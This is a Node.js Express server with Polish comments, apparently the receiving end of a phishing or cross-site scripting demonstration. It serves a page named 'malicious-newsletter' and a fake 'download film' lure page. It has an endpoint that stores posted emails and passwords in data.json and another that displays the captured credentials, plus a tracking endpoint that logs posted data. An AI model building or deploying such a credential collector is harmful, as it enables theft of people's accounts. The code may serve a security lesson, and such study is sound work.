const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const port = process.env.PORT || 3000;

// Middleware do parsowania JSON

// app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
// Serwowanie statycznych plików z katalogu 'public'
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.send("Hello World!");
});

app.get("/malicious-newsletter", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "malicious-newsletter.html"));
});
// app.get("/send-user-data", (req, res) => {
//   const filePath = path.join(__dirname, "send-user-data.js");
//   fs.readFile(filePath, "utf8", (err, data) => {
//     if (err) {
//       res.status(500).send("Błąd serwera");
//       return;
//     }
//     res.setHeader("Content-Type", "application/javascript");
//     res.send(data);
//   });
// });

app.post("/send-user-credentials", (req, res) => {
  const data = req.body;
  console.log(data);
  fs.writeFile("data.json", JSON.stringify(data, null, 2), (err) => {
    if (err) {
      return res.status(500).send("Error writing to file");
    }
    res.send("Data saved successfully");
  });
});

app.get("/read-user-credentials", (req, res) => {
  fs.readFile("data.json", "utf8", (err, data) => {
    if (err) {
      return res.status(500).send("Error reading from file");
    }
    const userCredentails = JSON.parse(data);
    res.send(`
      <div>User credentials: 
      <p>password: ${userCredentails.password}</p>
      <p>email: ${userCredentails.email}</p>
      </div>`);
  });
});

app.post("/track", (req, res) => {
  console.log(req.body);
  res.send(`data: ${JSON.parse(JSON.stringify(req.body))}`);
});

app.get("/download-file", (req, res) => {
  res.send(`
    <style>
    @font-face {
      font-family: "Mitr-Medium";
      src: url("/fonts/Mitr-Medium.ttf");
    }

    .download-wrapper {
      display: inline-flex;
      align-items: center;
      justify-content: flex-end;
      font-family: "Mitr-Medium";
      width: 500px;
      color: white;
    }

    .button {
      background-color: #c15303;
      padding: 8px 10px;
      font-size: 14px;
      border-radius: 5px;
      border: none;
      width: 200px;
      font-family: "Mitr-Medium";
      margin-left: 15px;
    }
    </style>
    <div class="download-wrapper">
      <p>Kliknij w przycisk, aby pobrać film: </p>
      
      <button class="button">Pobierz film</button>
    </div>
    `);
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
